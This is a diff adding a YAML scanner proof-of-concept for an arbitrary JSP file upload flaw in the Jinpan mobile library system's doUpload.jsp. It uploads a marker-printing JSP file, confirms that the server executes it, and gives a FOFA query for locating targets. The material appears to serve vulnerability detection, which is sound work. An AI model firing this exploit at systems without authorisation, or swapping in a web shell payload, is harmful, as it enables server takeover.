@@ -1,0 +1,37 @@
+id: poc-yaml-jinpan-mobile-library-system-doupload-jsp-anyfile-upload
+info:
+  name: 金盘移动图书馆系统 doUpload.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 金盘移动图书馆系统
+  fofa: app="金盘软件-金盘移动图书馆系统"
+variables:
+  t1: base64(random_str(5))
+  datetime: datetime("2006-01-02")
+requests:
+- method: POST
+  path: /pages/admin/tools/uploadFile/doUpload.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=399e563f0389566bd40fd4d6409a67dd
+  data: '--399e563f0389566bd40fd4d6409a67dd
+
+    Content-Disposition: form-data; name="file"; filename="jILUp0.jsp.jsp"
+
+
+    <% out.println("{{.t1}}"); %>
+
+    --399e563f0389566bd40fd4d6409a67dd--'
+  expression: status_code == 200 && contains(body,"\"filePaths\"")
+  output:
+  - regex_match(body,"(?P<name>[0-9]{10,16}).jsp")
+- method: GET
+  path: /upload/{{.datetime}}/{{.name}}.jsp
+  expression: 'status_code == 200
+
+    && contains(body,t1)
+
+    && !contains(body,"<")
+
+    '
+transport: http
